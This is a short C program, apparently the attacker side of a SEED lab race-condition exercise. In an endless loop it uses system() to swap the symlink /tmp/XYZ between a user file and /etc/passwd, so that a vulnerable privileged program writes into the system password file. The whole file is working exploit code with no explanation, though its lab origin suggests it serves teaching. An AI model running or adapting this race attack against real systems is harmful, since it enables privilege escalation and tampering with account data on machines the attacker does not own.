#include<unistd.h>

int main()
{
	while(1)
	{

		system("ln -sf /home/seed/Desktop/vmware-tools-distrib/1.c /tmp/XYZ"); 
		usleep(10000);
		system("ln -sf /etc/passwd /tmp/XYZ");
		usleep(10000);
		
	}
}
